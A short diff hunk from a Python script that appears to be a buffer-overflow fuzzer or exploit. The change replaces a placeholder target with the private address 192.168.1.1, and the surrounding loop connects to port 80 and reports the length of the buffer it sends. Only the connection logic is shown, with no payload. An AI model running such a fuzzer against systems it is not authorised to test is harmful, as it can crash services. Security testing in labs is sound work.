@@ -7,7 +7,7 @@ while True:
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.settimeout(2)
-        s.connect(("IP Target", 80))
+        s.connect(("192.168.1.1", 80))
         s.recv(1024)
 
         print('[*] Sending buffer with length' + str(len(buffer)))
